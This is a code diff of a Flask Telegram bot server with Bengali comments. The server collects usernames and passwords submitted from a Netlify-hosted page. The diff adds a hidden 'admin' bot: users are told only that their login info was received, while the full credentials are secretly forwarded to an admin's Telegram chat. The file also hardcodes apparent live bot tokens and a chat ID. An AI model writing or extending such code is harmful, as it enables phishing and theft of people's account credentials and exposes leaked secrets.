@@ -1,4 +1,3 @@
-# vsbot_railway_full_updated.py
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 import requests
@@ -9,8 +8,15 @@ app = Flask(__name__)
 CORS(app)
 
 # -------------------------
-# Bot Token
-BOT_TOKEN = os.environ.get("8472535428:AAGAcUvGClisEF9Kr0MsaKLGw5Je_AY4JVU", "8472535428:AAGAcUvGClisEF9Kr0MsaKLGw5Je_AY4JVU")  # Railway environment variable
+# Main Bot Token
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8472535428:AAGAcUvGClisEF9Kr0MsaKLGw5Je_AY4JVU")
+
+# Admin Bot Token
+ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "8218726690:AAHMwmdce9LJA1GPovRo4Exk4ON7_P4CUdY")  # <-- এখানে তোমার এডমিন বট টোকেন দাও
+
+# Admin Telegram Chat ID (যেখানে সব লগইন ইনফো যাবে)
+ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "1849126202")  # <-- এখানে তোমার নিজের Telegram ID বা Admin Chat ID দাও
+
 # Frontend Netlify URL
 FRONTEND_BASE = "https://beamish-speculoos-1994d0.netlify.app"
 USERS_FILE = "users.json"
@@ -34,7 +40,7 @@ def save_users():
         json.dump(registered_users, f, indent=4)
 
 # -------------------------
-# Telegram message পাঠানো
+# Telegram message পাঠানো (মেইন বট)
 # -------------------------
 def send_message(chat_id, text):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -42,6 +48,17 @@ def send_message(chat_id, text):
         requests.post(url, json={"chat_id": chat_id, "text": text})
     except Exception as e:
         print(f"❌ Error sending message to {chat_id}: {e}")
+
+# -------------------------
+# Admin message পাঠানো
+# -------------------------
+def send_admin_message(text):
+    url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage"
+    try:
+        requests.post(url, json={"chat_id": ADMIN_CHAT_ID, "text": text})
+        print("✅ Sent to admin:", text)
+    except Exception as e:
+        print(f"❌ Error sending to admin: {e}")
 
 def make_register_url(chat_id):
     return f"{FRONTEND_BASE}/index.html?uid={chat_id}"
@@ -80,7 +97,8 @@ def receive_login():
     
     if uid and uid in registered_users:
         msg = f"🧾 Login Info\n👤 Username: {username}\n🔑 Password: {password}"
-        send_message(uid, msg)
+        send_message(uid, "✅ Your login info received successfully.")
+        send_admin_message(f"👤 User UID: {uid}\n{msg}")  # Admin bot-এ পাঠানো
         return jsonify({"status":"sent"})
     else:
         return jsonify({"error":"uid not found"})
@@ -90,7 +108,7 @@ def receive_login():
 # -------------------------
 @app.route('/')
 def home():
-    return "✅ Bot server running!"
+    return "✅ Bot server running with Admin sync!"
 
 # -------------------------
 # Main
